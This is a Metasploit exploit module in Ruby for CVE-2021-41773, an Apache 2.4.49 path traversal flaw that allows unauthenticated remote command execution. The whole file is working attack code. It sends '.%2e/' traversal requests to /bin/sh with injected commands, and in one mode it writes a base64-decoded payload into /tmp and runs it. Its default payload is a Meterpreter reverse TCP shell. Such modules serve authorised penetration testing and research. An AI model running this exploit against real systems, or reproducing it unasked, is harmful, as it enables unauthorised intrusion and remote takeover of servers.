##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache 2.4.49 Traversal RCE',
        'Description' => %q{
          This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).
          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,
          it can be used to execute arbitrary commands (Remote Command Execution).
        },
        'References' => [
          ['CVE', '2021-41773'],
          ['URL', 'https://httpd.apache.org/security/vulnerabilities_24.html'],
          ['URL', 'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse']
        ],
        'Author' => [
          'Ash Daulton', # Vulnerability discovery
          'Dhiraj Mishra', # Metasploit auxiliary module
          'mekhalleh (RAMELLA Sébastien)' # Metasploit exploit module (Zeop Entreprise)
        ],
        'DisclosureDate' => '2021-05-10',
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
        'DefaultOptions' => {
          'CheckModule' => 'auxiliary/scanner/http/apache_normalize_path',
          'RPORT' => 443,
          'SSL' => true
        },
        'Targets' => [
          [
            'Automatic (Dropper)',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
                'DisablePayloadHandler' => 'false'
              }
            }
          ],
          [
            'Unix Command (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_command,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/generic',
                'DisablePayloadHandler' => 'true'
              }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/cgi-bin']),
      OptInt.new('DEPTH', [true, 'Depth for Path Traversal', 5])
    ])
  end

  def cmd_unix_generic?
    datastore['PAYLOAD'] == 'cmd/unix/generic'
  end

  def execute_command(command, _opts = {})
    traversal = '.%2e/' * datastore['DEPTH'] << '/bin/sh'

    uri = normalize_uri(datastore['TARGETURI'], traversal.to_s)
    response = send_request_raw({
      'method' => 'POST',
      'uri' => uri,
      'data' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}"
    })
    if response && response.body
      return response.body
    end

    false
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def exploit
    @proto = (ssl ? 'https' : 'http')

    if (!check.eql? Exploit::CheckCode::Vulnerable) && !datastore['ForceExploit']
      fail_with(Failure::NotVulnerable, 'The target is not exploitable.')
    end

    print_status(message('Attempt to exploit for CVE-2021-41773'))
    case target['Type']
    when :linux_dropper

      file_name = "/tmp/#{Rex::Text.rand_text_alpha(4..8)}"
      cmd = "echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name}; rm -f #{file_name}"

      print_status(message("Sending #{datastore['PAYLOAD']} command payload"))
      vprint_status(message("Generated command payload: #{cmd}"))

      execute_command(cmd)

      register_file_for_cleanup file_name
    when :unix_command
      vprint_status(message("Generated payload: #{payload.encoded}"))

      if !cmd_unix_generic?
        execute_command(payload.encoded)
      else
        received = execute_command(payload.encoded.to_s)

        print_warning(message('Dumping command output in response'))
        if !received
          print_error(message('Empty response, no command output'))

          return
        end
        print_line(received)
      end
    end
  end
end
